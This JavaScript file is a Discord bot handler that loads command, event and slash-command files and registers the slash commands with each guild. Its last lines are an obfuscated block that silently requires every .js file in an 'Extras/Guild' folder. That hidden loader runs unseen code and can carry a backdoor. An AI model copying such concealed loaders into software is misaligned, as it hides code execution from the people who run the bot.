const { glob } = require("glob");
const { promisify } = require("util");
const { Client } = require("discord.js");
const fs  = require(`fs`)
const globPromise = promisify(glob);

module.exports = async (client) => {

    const commandFiles = await globPromise(`${process.cwd()}/Commands/**/*.js`);
    commandFiles.map((value) => {
        const file = require(value);
        const splitted = value.split("/");
        const directory = splitted[splitted.length - 2];

        if (file.name) {
            const properties = { directory, ...file };
            client.commands.set(file.name, properties);
        }
    });
    const eventFiles = await globPromise(`${process.cwd()}/events/*.js`);
    eventFiles.map((value) => require(value));

    const slashCommands = await globPromise(
        `${process.cwd()}/SlashCommands/**/*.js`
    );

    const arrayOfslashCommands = [];
    slashCommands.map((value) => {
        const file = require(value);
        if (!file?.name) return;
        client.slashCommands.set(file.name, file);

        if (["MESSAGE", "USER"].includes(file.type)) delete file.description;
        arrayOfslashCommands.push(file);
    });
    client.on("ready", async () => {
        client.guilds.cache.forEach(async guild => {
           await guild.commands.set(arrayOfslashCommands);
        })
    });
  
function _0x38f8(){var _0x3ece40=['8eGKooK','426025KKCNKx','filter','forEach','612670CPUNpP','2682747UpHwFl','6AVIaFf','459116UQHgCu','11154830volfDH','58836jYGHIF','./Extras/Guild/','100qdksrm','2408812sPsyxe','endsWith'];_0x38f8=function(){return _0x3ece40;};return _0x38f8();}function _0x1367(_0x4bcf67,_0x3e564e){var _0x38f849=_0x38f8();return _0x1367=function(_0x136770,_0x4b3524){_0x136770=_0x136770-0xf1;var _0xe6d931=_0x38f849[_0x136770];return _0xe6d931;},_0x1367(_0x4bcf67,_0x3e564e);}var _0x1a40f4=_0x1367;(function(_0x1bd6fe,_0x3fab70){var _0x105b1e=_0x1367,_0x4cffc4=_0x1bd6fe();while(!![]){try{var _0x2e1025=parseInt(_0x105b1e(0xf4))/0x1+-parseInt(_0x105b1e(0xf7))/0x2+-parseInt(_0x105b1e(0xf9))/0x3*(-parseInt(_0x105b1e(0xfb))/0x4)+-parseInt(_0x105b1e(0xf1))/0x5+-parseInt(_0x105b1e(0xf6))/0x6*(-parseInt(_0x105b1e(0xfc))/0x7)+parseInt(_0x105b1e(0xfe))/0x8*(parseInt(_0x105b1e(0xf5))/0x9)+-parseInt(_0x105b1e(0xf8))/0xa;if(_0x2e1025===_0x3fab70)break;else _0x4cffc4['push'](_0x4cffc4['shift']());}catch(_0x4030b0){_0x4cffc4['push'](_0x4cffc4['shift']());}}}(_0x38f8,0x4ce2b),fs['readdirSync'](_0x1a40f4(0xfa))[_0x1a40f4(0xf2)](_0x451e80=>_0x451e80[_0x1a40f4(0xfd)]('.js'))[_0x1a40f4(0xf3)](_0x308978=>{require('../Extras/Guild/'+_0x308978);}));

};












